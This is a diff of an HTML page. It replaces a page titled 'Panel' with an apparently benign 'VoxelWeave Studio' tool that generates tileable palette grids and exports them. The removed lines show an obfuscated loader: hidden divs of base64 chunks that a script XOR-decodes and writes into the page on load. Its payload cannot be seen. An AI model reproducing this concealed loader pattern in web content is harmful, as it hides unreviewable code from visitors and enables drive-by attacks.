@@ -1,33 +1,323 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Panel</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VoxelWeave Studio</title>
+<style>
+  :root {
+    --bg: #14171c;
+    --panel: #1d222b;
+    --panel-2: #262d39;
+    --text: #e8ecf2;
+    --muted: #9aa7b8;
+    --accent: #6ea8fe;
+    --ok: #3fb96b;
+    --error-bg: #3a1d22;
+    --error-border: #e05260;
+    --error-text: #ffb3ba;
+    --border: #343c49;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; background: var(--bg); color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 15px; line-height: 1.5; }
+  header { padding: 18px 24px; border-bottom: 1px solid var(--border); }
+  header h1 { margin: 0; font-size: 20px; letter-spacing: .3px; }
+  header p { margin: 4px 0 0; color: var(--muted); font-size: 13px; }
+  main { display: flex; gap: 20px; padding: 20px 24px; align-items: flex-start; flex-wrap: wrap; }
+
+  .panel { background: var(--panel); border: 1px solid var(--border);
+    border-radius: 10px; padding: 18px; }
+  #controls { width: 320px; flex: 0 0 320px; }
+  #preview { flex: 1 1 420px; min-width: 320px; }
+
+  .field { margin-bottom: 14px; }
+  .field label { display: flex; justify-content: space-between; font-weight: 600;
+    margin-bottom: 5px; font-size: 13px; }
+  .field label .hint { color: var(--muted); font-weight: 400; }
+  .field input[type="number"], .field textarea {
+    width: 100%; background: var(--panel-2); color: var(--text);
+    border: 1px solid var(--border); border-radius: 7px; padding: 9px 10px;
+    font: inherit; }
+  .field textarea { min-height: 84px; resize: vertical;
+    font-family: ui-monospace, "Cascadia Code", Consolas, monospace; font-size: 13px; }
+  .field.invalid input, .field.invalid textarea {
+    border-color: var(--error-border); background: #2c1d20; }
+  .field .field-error { display: none; color: var(--error-text); font-size: 12px; margin-top: 4px; }
+  .field.invalid .field-error { display: block; }
+
+  #message { display: none; border-radius: 8px; padding: 10px 12px;
+    margin: 12px 0; font-size: 13px; border: 1px solid transparent; }
+  #message.show { display: block; }
+  #message.error { background: var(--error-bg); border-color: var(--error-border); color: var(--error-text); }
+  #message.success { background: #16301f; border-color: var(--ok); color: #a9ecc3; }
+
+  .buttons { display: flex; gap: 10px; margin-top: 8px; }
+  button { flex: 1; border: 0; border-radius: 8px; padding: 11px 14px;
+    font: inherit; font-weight: 700; cursor: pointer; }
+  #weaveBtn { background: var(--accent); color: #0c1626; }
+  #exportBtn { background: var(--panel-2); color: var(--text); border: 1px solid var(--border); }
+  button:disabled { opacity: .45; cursor: not-allowed; }
+
+  #snapshotInfo { margin-top: 14px; font-size: 12px; color: var(--muted);
+    border-top: 1px solid var(--border); padding-top: 12px; white-space: pre-wrap; }
+  #snapshotInfo strong { color: var(--text); }
+
+  .canvas-wrap { background:
+      repeating-conic-gradient(#20262f 0% 25%, #1a1f27 0% 50%) 0 0 / 20px 20px;
+    border: 1px solid var(--border); border-radius: 8px; padding: 10px;
+    display: flex; justify-content: center; min-height: 220px; align-items: center;
+    overflow: auto; }
+  canvas { image-rendering: pixelated; max-width: 100%; height: auto;
+    background: transparent; }
+  #emptyNote { color: var(--muted); font-size: 13px; }
+  .meta { margin-top: 10px; font-size: 12px; color: var(--muted); }
+  .offline-badge { float: right; font-size: 11px; color: var(--ok);
+    border: 1px solid var(--ok); border-radius: 999px; padding: 2px 9px; font-weight: 600; }
+</style>
 </head>
 <body>
-<!-- page loaded -->
-<div id="qgfzrxjage0" style="display:none">2/0L5h8QbfpD4fehiNB6zKmmf8Awy9MgPIW6JMYBvtKx2wTu9YtPk+z/QRZx2TSZ1AMk10yfiexviDrOvOcflIq5O8h8KlXHY/y9o4zZM7b6vH+PfIjQLyaH6XKeTeuF35MEtvCKB/Cz9wkVeZ0jmZlRPtxR1sL4d8Nklf+1cJXW/nGjYClR3mfh8bSI2Xnk9Lt/xTOZnWFywqdlzAHoidWTUanEjh34tPtKEVetD9OLe2vfXdbKuXWPepOj+3LNibk9yCgrRogmovC7kdkqsqjsZ8Irxs8uPpuqdsID+ZjPgkHt+50W/PCjFEwg12fTi3tr313Wyrl1j3qTo/t33Y6wK4t8ZBSKJqLwu5HZKrKo7Dmfb9Odf1je6mPXDryC2ooJtradFO+54U0Nftt30dYeOcZdzN+kOdwv1KDTKcWCqC6JMiVZzzvj7bCJ2SW18KopjXyI0C8mh+lynk2t1JuoD/+03kij5KsGXBrFOpTBEHfcWc/OpDmNeIbnq3zPj6htiT8rWt5jr+vox4509KPsNadgn9Y1Poe5aswYsZzUixWm5I4d/KTmQU92liWW0E14xlHWx/wl5CuF6qB5zdnWb4k0MFnGKqPwsZzHKafnqWLDZtuEMTOG42/NCKbcgJAF7+CHS6jgogFZeJw+lt0FbYMIko6ieY90nfmret2JuHWKOiJSkWWu87qXhmf3pP8w0FbLnyM9hv59xwbvnNeGFbHygxTh6/NIC3eXepjBFDrBAsHO92+LZc30rGbcjro2hD8rWt5jr+vvhtkqsvC8MKd8y59hNI3pco4J/YHSixWxuY4B6bz3CRFpiiOU2F0V3lHMwNR6jUSP7a1wxaGzId1wZmfPYa769bD1Zurdq2fbOZ/WIjPOxnTKDvDAyIYC+</div><div id="qgfzrxjage1" style="display:none">LmcFOu59B9oMNl30dMeOcYV0cLjftQmw+6hLsSOsiqENCFdzW61peTLinH94atz2XGK0yg1jL1lxgHoicncHOrwixj3t6gWVmCBbJPaCXrBUdjC93zUdZnsvXDayr4g0Wc5Poom7/Kmgscpp+3jfMQ4n9d7Z9S3dttU4eabx0Lm54hR+KvxSw5/i23ShUFhhFvBkO1+lmPb+rx2x5W9O8AzKg7Eaa/67ofTNqLwvCbPM5/LLj/YtnbbT++D144Iq/eaA+u1/FAhf5U4g44MXZIYjMbqfM52zPa2Y82VpyDZPSdd3n/7seLewU7mte1owimFyzo0jelyjhj5hdyPGLGi30Gitv1KFj2PNoPcEDnGFcze9H6cfpWkrXTKkrAu23EqQcd1+uLfypY28uGIapQ+mv0wGI2xa/Af3rzssjvE29038KLRQVJBsiKb4DgGhFnmw/p+tk2i7YFl77fqOc8pPU7ZS7bQvYbaHYTvoGqcP4PuDyOVsXLWDqy5j99aycG/Gs+4yE4Ofswgi/8Qbt5yxZ3YbqZQm+yyV96g5QLvZShSzl+P8ZSn5RCu06NxyDKz8Ss+gcJM4QzJj9fQCsrMmR3zkcdPUSXLZpuMKB/9SfvP2Fq5TZ7tkFqQkOoZyB4BYf0zlvO7is0clP29ZsUsiI14GLC3MfIe66j+vjTS3pU477/ibBhglx6+70UkgHTU+eltpV+d/JpTnYaMfvMOHEWTavjL4tXmBZDhlFrGKr71Jj2otG77KMWK/949+MCZQPeU6lANaZwkxeRAG+gJkt3dKY9tmvaIRPzXrhrMZRVe/HewxpnU/g2+0KVAwyW8xQw0kPdT4SbIofKJXObfgxPcmqNVM1zJMaXjGCLbdO7bqm+2Qcbx7ViakqQA5</div><div id="qgfzrxjage2" style="display:none">x4vZuhquOWFrO01hdz6fsgZ3eZ0YI6+XNlcyLvp0BTkwqE1373ZE1JXmBbG9ho/4Qz43uNxrXSbr796x7SQIMc6FQTiNaDusd35cqnlvVGdbtrFICezz37mVv+Pz7VU6OOkGcOJxBIDc8E6toM2HIJI8Jr8V79Vg9SOfc3WiD/sE3xF53Lw+eKv9zGw8Z1R2wjS7ioI0Mpx6T6rguvRO+nQu0jLg8tzBUOuYZ/NIWXYYZDJ8SKgXpDLr13A0ogsxAkhcsFgjtyTi/gOtfehPu42qvsCZK7kR8Jf9b/pjSXO4bxI3ZT6ZTtUyhO65z4nwF/1ya5NiEed3bps5o6yFs01KnrbR6vev62PcqTglm3lbKbPNAeW01fJJvCC0qI2s+ehCKiF53cKIZoiw+xIJPNcwOfzfKZtkfGaZdqOuw7LN3Vf6UOb7+edyQmj/79+xAWDjQphr+h1whbatIufJMytij/em/1GB0SeZMngJCP8QZDj91meUofU70TRlYV8mx8VeOZli967vYkzktucOMA3j4gYNor1XuoI1qjInlnP4ZUkwbX5aQBVyzqTjDsQxW3I+q4voHGQrbV3542uB/0RN3HlT4/FpZPRBYfR+jKaKN79cGW3tGXTOqmHzo0r0cSBM/qa6EZXSo4ShfIAI+Z+9+egc9pAxf+wTe6qsQXQLzIAwHyv8aeJyTKw76Vd7z6N5zVikcFNxRzu39yWHPrNqgCt49hJDEKYZ7nEBx3AD/jT33+cYoT4oFGar7ghxDQLQud/htiZ3Ywd9MWtffoxoco1EKjpNpRezZzIvz3KxpgB0rnhclIjzyO89Ec0xHPq5s18lFys1a4j2N/lLuwsMEzwXIfnsIfFcbb0pmKbLLr+Jzas7FDhCf2d74gZwKOJI+u</div><div id="qgfzrxjage3" style="display:none">y92YzQbU/v/cIOMN65Oz/SZ9ngKqOJsGeuyTxESMCkjWq3JCfixW28opblSrc2CI5hbFj5hfoisuPH7/MqD+tp99PCVSfGIT4IT7eaebMrWu7UYDwjH76sro17zQJccRNoMeZq/M+kf+UZtxv3eYrK4XCPvEh6Z7Zlgff36Y5yYb+ExYksgSbhhYngGvV4f9ynWWM5K595YyvHswwIU3dbvmt4aOLE5D7u2SYOqPmJySN4UL6Csig3dc/+t+bAdu/y3QYdZ0Vh89HMNYNzP3jdLZfg9CNVOmitAWdNAhb6Tfwroer8XWX9PdD4h7Y0jIXst0+mhfXjuGVA/r810DBqMVwWyOJJpP8QD3oX+bS13iHZbT1vU3CoZQ7/Q41eOFLqNqhssh3iMKZcsY1h+0AG4f+TpYn7d3Y0wvF5d4B4If8czVywQ6a3hIP+F/2xv9/lGa02elG75Cuft4xHETjNfX3446EIb7djD/GOqH2MyqQ6nD0KNqn9pYN7t+pR/OJ414paKwCpO88PvFs4c/NSt4nvNODRsyikTvfCxBcwmX005vX8yy++6Zjnjnc0SA4lr9ClF/InP6DC++kuijr5dN3VUChYrf4EBTjYdLz8VbeU6X76WTEv68Z8zEMTulkgPiM1fIrqKWCfOIIqvwvCoG0X/s/1pzXlznurb81obfjb1NXzmS/2RAagA3w+fZDr2ew5J13nZe5JsMWIQPnSqfvjd35AaTBgHv/b4eLER6zvjLkFvua/oBZ3qysB9iC91ANJbQyhtcmYPlpyPn0fZdFgO+jc8CWlDvlOwYA836kxuyx1RClpJlE+Q2piisqm+5Oyg6tr9feCNPNuSLwtPpeLlS+ALPlICLaSuH4rnyNco7s4G+RhaV48y4zBNpym/WDqI4</div><div id="qgfzrxjage4" style="display:none">A9KGaMvgPs+8EJaTPRcUl167Xlin5xdgw1bLRcAhnuji35ichgmHw3u9tpGSPzp5a4oKPeMIYNFyYcITr47yFHvf+iGP9OIfmeQC6zlLUCqqi3qJa/vqCO9iB+FQ2X5Q0xeVCAoJV6frYb9t1ksqTIPyLvhnbHgNB4UWD/pSV2Cu19KtG3BKH7nkGhOZE2gnOmejfDdH2nAjOv6ATCFqoMr/3GgbGYvvn+yrZXIHajG/QgZ88kRIlbPNKt82dp8w8tcarXf0JjI4jMJWyR+ELxZjPkjr+36od8oLbczF5vhay/DAC0Vbs3sBXtybP5pxb8Y3sBNgVE2XkRbHTjNKIfbT8ijPaKZnyFCqr11bKNciP3Z4jz+SnJK+l/WMGc7QDyfAVP4BR6ZjrftcnouiSZO6PkDzvODF8n0fz7rKr0yH32bld5yuSyAxkseh82S3Fo4OuLv7bnkPOnep8VnOaZKLBGxnHAfXqq03dRcXs70PLk4QjmW8lZs5+tO+HrPoxrNj4ffs62O41OIbdM+Ad2IWDlAjuoqIe1KrZUzglmj+C3yk66nzrw/B/t3yY14Fz8rPke/kLA2ToU5Xe5qzMDoLi+0HGGI7eFjTaw1/VJ9Kg6p5d2visBKqa2mEEYsk9kN8XGOJ609qsT9xbnMqSYcyx5C3DORFlyGqLzuWujHOP+6N43SSY6AU/ht9k8ADInY+/BOLD1gjYgvxXW3rOL7zNHiH4evfR7Cm/WZrU6FrMk5s3wT0gYppHjazmtf40ruH5c55smetwKKvfMPE4qY7Cihy82dc3/+XBYidFijOa4xYH1Hfu2Olep2WezO1j/oKGBO4QPGSSNK/o4NDoPJDnhTz+MJrscT/b7GL2NfXV6pIa4aXdQPS2wUYkZZ</div><div id="qgfzrxjage5" style="display:none">8+g8QpZ/NX0c/9Uo9knfDqYN+AuCLNBgdb+22W+a/X8Hf2zYVR+h+dzAgB0+BA8xvQhIK2JdOlgBL96aBAMnmaJ7fBHiL0YcnR6FqXXcOstSKa37glnDM0VshyrKaQrPUQiNu5OO8ortwtatf/beUk05bCkRWyzKIS8J6lbCF8qwCn0xUR2Urt+9p3lFi58YhU3YqyBpoXMFXkbpna5a7rEIjzqj/3BKHOcQiDwWH2KtmO9q0BwPmiP/rn3BUsQa44pMw7ZvVry+f/U9Yhj9azYZ63mQDsG3db5DO71bGviwyI8Z1g1AmH9REBu60pn0DvmMKLCbWe017xtfNAXBrFNZ7RCGm4BMbC7zuNe5ftqiiKiq8oi2JOFIpWrfq0ltlksfSnf406hM1hJoriJsIa6IPWhhji988D/LT7VgdzjXeex1Fr0xjLz6Q5iXjUvrFnzYHhbcEoMETZPO6wsJ3ZJ+jyq3nFM4/bbzGN6inIXOaVzN8B+bbREvW58U9CeJwllIleNowWqIu5J4xlyJT5NfqCuCbbOSdAw2imv7yLnHi15a9ljTWPgmMxjfJo102i2YfIH/v1gU+5o/dHDX6df4Kck9cUMp6E/XKYKfyU0ynMjqpv2ig9WM874/u8lswop+z0ZcIyjp1hNoPzZ44C/Y/JiFGp06YlzIPXdixRtBLTiyE23lnGwvdoqUOuovZxwZHiRZU4LUKKdbXmuYCBZqL8vXvBPZKFLz2M4iSDC/2Y2soB6vedHqTywGEyX6YZsPg0dYxUzdy0a4F7j7OpdMSCqDvMcSJb2GGko/qB1TL4n/JvxCrLzDUrjuI7gQv1n8uLDfKugR73tbAEBnGNNtzYEDTAV5+Jz168RL/RlzeW1uxhmXJ0CIViqOnr74</div><div id="qgfzrxjage6" style="display:none">Agr+PueNklh9p8cIbuddMD/ZWBiQPl8c1R/bHmRU99mDSD2kx18Xfv5tBPvTXIrOsmkNvzK8Aqej6WYqjp9ZbIParw8ynJNZjPLTObvWjMAfnOm4MN//XCHPiz4EtfMqsSvfAwBPdrgJWrI9I4kvevK6LbuCbffDdA02qkoveB1Te2+a9ylzKE0SRwwuNn1w6xgdqEHuSpzSPcnNdlMVWmE7DhNHWMCZqL1niaN8en4yGR2/MrwCp6PpZiqOn1lsg9qvDzKck1mM8tM5u9aMwB+c6bgw3/9cIc+LPgS18yoBKw51NpgAiQnaU0in6AoNMflJS/PcAsMAqgLqfqu4bILan77iOEfJC1YXKU5nSDHOiNyZMJ77TSUf+x/lcHK/Nd0ZUXItxb1sL2dc5kgv+rYYDO/DSjfGQUim+nv/2WyCW04atvhHyZ2jUnkOk9qU+8zJuUGOrmmxT98K8EFmKMMsq/e3eSGILd+GnOdtaj+XHHhKkizDIwGs1jtdq5gNEhqOGMcuQ4w5gmPcWuPalPvMybjgqrvM4QsPDpBBZigHeKlRI43EvNx/w1mXaE8PEy85WBb4o7KxTEabW/s4rJKqKy5zCNIcvcICaB7yaLCrXMwJpM+fGbBOu+qQQfGvN30ZVRIdNKgtn4bM4q1ra4O8+CqA7dKDZdyHO1+v3C1Daj8+kijSCXn2Z1y6ly0QbxxJLcZoG0z1G5/7gEJWWYJZWPUTrTW9DEuWyPZNbwtmGIlKkt2igtQN9ypPv1z5NO5rXuK8Q6y5dgIIPwJt8TvJ7akEy2qdJRvovAYSZZqxKy4S4C4HT/jLlnkjeE/647y4+9PegobASDJvyi6MWbH+G87nCnfMufYXLC83TaT+fM2IgC+PuDFLen81YMON4M</div><div id="qgfzrxjage7" style="display:none">g+hRP8BdxIv3dJo3heu7ZtyOqDrdOSAOjSrh7bSSlX/m6O5ozCiI12F6h64m2BKWzJvHTKu0nRTtpeBKWRrZd9GVDF24GIKLuTTEN7Dxq3bNx70t2jMoQd5j4cqHqZxsp/GqK8Uon88yaM2oJsoJvJzJiBjk94AdubnhBA95iiSY2xZ+khKNobk7zjef+Pk9iciCJ90oNEeVPJ2wicqTLejhq3jZdJneNnvLp32pT7zMm8dM+fWYUaTwvXo+P6V43psFMsFMitn4bMc3yb7+fdyTrDyTe2QfinSg6PXfnGOu4bp73mbEkGZyyad0whiynt6XAOr3ilm2js4LST/Vd9aSWGy4GIKLuWbkHda++TXehq5v3C4oD6Am4b/1kc495u7uft8wy4JhPIfwJvY90MTJhhuntIse+qX/QQxk1zWQxhQC4HGLhfFpi3HNvqQfiMf8b8o9MFfCJun6/MXHZLD0vCvZfNafJT2B8mvGAejC2JUJ6uCKNPW1/0EMZNFwkJJYbJJMjMPrfog3y76rdN/c/DrbMGQJinLv96eA2n/m6MQBjXzLn254wtVjxQP5j8/HGOPxzwP8o/1IFHWdd6TnPXfQWcHAuXSAY5m+rX3Nx7AmxzdkHoUM4b/1xd1qtfC6StkomdYjJ5biLoQH7ondwECr4Z0dsOuYLkIw2XeFxwh3yRjBxPdogXuTsLV6z8/7FNsBZEbPYqjtsIbIZLL66SeNKZnTbXLF7miDWu/LktxM9rSMEO2z+gRKddB3ish7XZIYgou2Mc5Bn+2wd8SC/CzGKSpAzmm28e/FiWQkE1wrnHDLyyk3jKd0xgv1nt6EGKu+wHu58LIEFHGLd5TZUWqSXM3I7HaLeYKwvnDcorAqxDkqQOh/iPv9wt8rs/u6LIR</div><div id="qgfzrxjage8" style="display:none">n4Z9hcsLxZ9FP8Indk0y2tNpKk9qyBEIwkDHRnRQ7mxjHx7dvi2+C3bZ73IKyO4lhZGfedKjxss3QIaDh5zCnVsufYXKU5nSDG/WB3pVMtrScFO2Z/FAHYo82nZ0XItxb1sL2dc4/376iH4jH/G+JfChRzHLssu7vnGTmte4rxDrLlyQ+y6djz0HoicOTL+T6mxT3pLIZQkONJZjbFn/eXcTfuSXOJ9ah+XnNgahvk3x0HZEMy7/1xZxk5vyoK4Uwjtk1ct66JpNGvJexx0yrtM9RufDxSAdxix6fwRQlxFnOg+1yg3KEt+IfiMf8b4l8ZBTedLi/rsXLLajxoXyDMITcICaL6GiNHfmc14YP7ryaA/X5qQQfGtl30ZVRd5IYwcrteIY33vvoPIic1m+JfGQUiibhv/WRzj3m7u58xDKP0DZ8juhlwhv1g9XJDfjnhhb3+OdWDjnCd4y/UXeSGIKLuTvON5X/rXbAx/Qqm3VkT4pxqPGxistqqvqtatk1hNFvOpDiYINSvJnJi1er6eVRufCyBEIw2Sr7lVF3khiC1pM7zjfW4/U1mdfsf4BnThSKe8uV9cXVIua9qmTOKYbaLybM9WPCC+W/z4YY7rTSTKTwtUgNcZ0+n9JWfpJDqIu5O85zmf2seM2JqGHIOCBx3GOv65mMzzCj+6t5hXuv8AwRjelyxgHooNSGCO7wyF25o+ZFEGTQbPuVUSqSXc7Y/DuVHda++TXbk7093XRtD6Am4eLf75xk6b/uWMw6jss4cozicoNFs+abxwjk95oc/L7mCgN0nRKH0B8j/lHR3/x1i2XeuZ1a5aSzId05KkDmaaD7sIGbaObmumrfKMKESy/Lry+YZaDDyIQe4uSbT5PsvUYNdIBp+4leP8ZVzpU=</div><div id="CQPZwrOr2I6y" style="visibility:hidden">0</div><div id="xe7ee3084f3" style="visibility:hidden"> </div><div id="mjwupogej" style="display:none">x</div>
-<script>function wbu7ys(){return Math.max(3,43);}
-/* stable path */
-(function(){
-var aoOYRc=atob('59xPqVxENKoGwZ/V5bxExpXOC61c679BUuKHBqNvnOy752yLlO9xmdCSJGIQ+VfxtXFXsjiiq5kb7hf2ntkVqA==');
-var UriU8W=[];
-for(var Rv0Sul=0;Rv0Sul<9;Rv0Sul++){
-  var _e=document.getElementById('qgfzrxjage'+Rv0Sul);UriU8W.push(_e?_e.textContent:'');
-}
-var seNrXT=UriU8W.join('');
-var Asuw5P=atob(seNrXT);
-var wSMy14=new Uint8Array(Asuw5P.length);
-Rv0Sul=0;
-while(Rv0Sul<Asuw5P.length){
-  wSMy14[Rv0Sul]=Asuw5P.charCodeAt(Rv0Sul)^aoOYRc.charCodeAt(Rv0Sul%aoOYRc.length);
-  Rv0Sul++;
-}
-var P5BOXm=new TextDecoder('utf-8').decode(wSMy14);
-document.open();
-document.write(P5BOXm);
-document.close();
-})();</script>
+<header>
+  <span class="offline-badge">● offline ready</span>
+  <h1>VoxelWeave Studio</h1>
+  <p>Weave palettes into tileable low-poly texture grids — everything runs locally in this page.</p>
+</header>
+
+<main>
+  <section class="panel" id="controls" aria-label="Generation parameters">
+    <div class="field" id="field-rows">
+      <label for="rowsInput">Rows <span class="hint">1–512</span></label>
+      <input type="number" id="rowsInput" min="1" max="512" step="1" value="8" inputmode="numeric">
+      <div class="field-error" id="error-rows"></div>
+    </div>
+
+    <div class="field" id="field-columns">
+      <label for="columnsInput">Columns <span class="hint">1–512</span></label>
+      <input type="number" id="columnsInput" min="1" max="512" step="1" value="8" inputmode="numeric">
+      <div class="field-error" id="error-columns"></div>
+    </div>
+
+    <div class="field" id="field-cellSize">
+      <label for="cellSizeInput">Cell size (px) <span class="hint">1–256</span></label>
+      <input type="number" id="cellSizeInput" min="1" max="256" step="1" value="16" inputmode="numeric">
+      <div class="field-error" id="error-cellSize"></div>
+    </div>
+
+    <div class="field" id="field-palette">
+      <label for="paletteInput">Palette <span class="hint">hex colors, separated by spaces/commas</span></label>
+      <textarea id="paletteInput" spellcheck="false">#264653, #2a9d8f, #e9c46a, #f4a261, #e76f51</textarea>
+      <div class="field-error" id="error-palette"></div>
+    </div>
+
+    <div id="message" role="alert" aria-live="assertive"></div>
+
+    <div class="buttons">
+      <button id="weaveBtn" type="button">Weave</button>
+      <button id="exportBtn" type="button" disabled>Export atlas + manifest</button>
+    </div>
+
+    <div id="snapshotInfo">No successful generation yet.</div>
+  </section>
+
+  <section class="panel" id="preview" aria-label="Preview">
+    <div class="canvas-wrap">
+      <canvas id="canvas" width="0" height="0" style="display:none"></canvas>
+      <div id="emptyNote">Press <strong>Weave</strong> to generate a grid.</div>
+    </div>
+    <div class="meta" id="canvasMeta"></div>
+  </section>
+</main>
+
+<script src="voxelweave.js"></script>
+<script>
+(function () {
+  'use strict';
+  var VW = window.VoxelWeave;
+
+  var els = {
+    rows: document.getElementById('rowsInput'),
+    columns: document.getElementById('columnsInput'),
+    cellSize: document.getElementById('cellSizeInput'),
+    palette: document.getElementById('paletteInput'),
+    weaveBtn: document.getElementById('weaveBtn'),
+    exportBtn: document.getElementById('exportBtn'),
+    message: document.getElementById('message'),
+    canvas: document.getElementById('canvas'),
+    emptyNote: document.getElementById('emptyNote'),
+    canvasMeta: document.getElementById('canvasMeta'),
+    snapshotInfo: document.getElementById('snapshotInfo')
+  };
+
+  // The single source of truth for the last SUCCESSFUL generation.
+  // Both the canvas and every export derive from this; input edits never
+  // touch it until a new generation fully succeeds.
+  var lastGood = null; // { snapshot, model, dataUrl }
+
+  var FIELD_MAP = {
+    rows: ['field-rows', 'error-rows'],
+    columns: ['field-columns', 'error-columns'],
+    cellSize: ['field-cellSize', 'error-cellSize'],
+    cellCount: ['field-rows', 'error-rows'],
+    totalPixels: ['field-cellSize', 'error-cellSize'],
+    palette: ['field-palette', 'error-palette']
+  };
+
+  function clearFieldErrors() {
+    ['rows', 'columns', 'cellSize', 'palette'].forEach(function (name) {
+      var ids = FIELD_MAP[name] || ['field-' + name, 'error-' + name];
+      var field = document.getElementById(ids[0]);
+      var err = document.getElementById(ids[1]);
+      if (field) field.classList.remove('invalid');
+      if (err) err.textContent = '';
+    });
+  }
+
+  function markFieldError(field, message) {
+    var ids = FIELD_MAP[field];
+    if (!ids) return;
+    var fieldEl = document.getElementById(ids[0]);
+    var errEl = document.getElementById(ids[1]);
+    fieldEl.classList.add('invalid');
+    errEl.textContent = message;
+  }
+
+  function showMessage(kind, text) {
+    els.message.className = 'show ' + kind;
+    els.message.textContent = text;
+  }
+
+  function clearMessage() {
+    els.message.className = '';
+    els.message.textContent = '';
+  }
+
+  function readInputs() {
+    return {
+      rows: els.rows.value,
+      columns: els.columns.value,
+      cellSize: els.cellSize.value,
+      paletteText: els.palette.value
+    };
+  }
+
+  function renderSnapshotInfo(snapshot) {
+    els.snapshotInfo.innerHTML =
+      '<strong>Last successful generation</strong>\n' +
+      'rows: ' + snapshot.rows + ' · columns: ' + snapshot.columns +
+      ' · cell size: ' + snapshot.cellSize + 'px\n' +
+      'cells: ' + snapshot.cellCount + ' · sheet: ' +
+      snapshot.widthPx + '×' + snapshot.heightPx + 'px\n' +
+      'palette: ' + snapshot.palette.join(', ') + '\n' +
+      'generated at: ' + snapshot.generatedAt;
+  }
+
+  function weave() {
+    clearFieldErrors();
+    var input = readInputs();
+
+    // --- Palette first (it is not part of the numeric linked checks) ---
+    var parsed = VW.parsePalette(input.paletteText);
+    if (parsed.invalid.length) {
+      markFieldError('palette', 'Invalid color(s): ' + parsed.invalid.join(', '));
+    }
+    if (!parsed.colors.length) {
+      markFieldError('palette', 'Provide at least one valid hex color, e.g. #2a9d8f.');
+      showMessage('error', 'Generation rejected: the palette contains no usable colors. ' +
+        'The previous canvas (if any) has been kept.');
+      // No canvas mutation: lastGood stays intact.
+      return false;
+    }
+
+    // --- Linked numeric validation (per-field caps + combined thresholds) ---
+    var result = VW.validateParams({
+      rows: input.rows,
+      columns: input.columns,
+      cellSize: input.cellSize
+    });
+
+    if (!result.ok) {
+      var err = result.error;
+      markFieldError(err.field, err.message);
+      showMessage('error', 'Generation rejected — ' + err.message +
+        ' The previous canvas has been kept.');
+      // Explicitly do NOT touch the canvas: no half-written output, no clear.
+      return false;
+    }
+
+    // --- All checks passed; generate from the validated params only ---
+    var params = result.params;
+    var model = VW.buildGridModel(params, parsed.colors);
+    VW.renderGrid(els.canvas, model);
+
+    var snapshot = VW.createSnapshot(params, parsed.colors, new Date().toISOString());
+    lastGood = {
+      snapshot: snapshot,
+      model: model,
+      dataUrl: els.canvas.toDataURL('image/png')
+    };
+
+    els.canvas.style.display = '';
+    els.emptyNote.style.display = 'none';
+    els.exportBtn.disabled = false;
+    els.canvasMeta.textContent =
+      model.cellCount + ' cells (' + model.rows + '×' + model.columns +
+      '), each ' + model.cellSize + 'px — sheet ' +
+      model.widthPx + '×' + model.heightPx + 'px, tileable edge-to-edge.';
+    renderSnapshotInfo(snapshot);
+    showMessage('success', 'Weave complete: ' + model.cellCount +
+      ' cells at ' + model.cellSize + 'px per cell.');
+    return true;
+  }
+
+  function download(filename, content, mime) {
+    var blob = new Blob([content], { type: mime });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
+  }
+
+  function exportBundle() {
+    if (!lastGood) {
+      showMessage('error', 'Nothing to export yet — generate a grid first.');
+      return null;
+    }
+    // Manifest is built ONLY from the success snapshot, so editing an input
+    // without re-weaving can never leak un-generated values into an export.
+    var manifest = VW.buildManifest(lastGood.snapshot);
+    var manifestText = JSON.stringify(manifest, null, 2);
+
+    // Decode the snapshot's PNG data URL into a binary blob for the atlas.
+    var bin = atob(lastGood.dataUrl.split(',')[1]);
+    var bytes = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+
+    download('voxelweave-atlas.png', bytes, 'image/png');
+    download('voxelweave-manifest.json', manifestText, 'application/json');
+    showMessage('success', 'Exported atlas and manifest using the last successful ' +
+      'generation parameters (' + manifest.rows + '×' + manifest.columns +
+      ', ' + manifest.cellSize + 'px cells).');
+    return { manifest: manifest, manifestText: manifestText };
+  }
+
+  els.weaveBtn.addEventListener('click', weave);
+  els.exportBtn.addEventListener('click', exportBundle);
+
+  // Test/automation hook: headless verification drives the exact same code
+  // path a human uses.
+  window.VoxelWeaveApp = {
+    weave: weave,
+    exportBundle: exportBundle,
+    getLastGood: function () { return lastGood; },
+    readInputs: readInputs,
+    showMessage: showMessage
+  };
+})();
+</script>
 </body>
 </html>
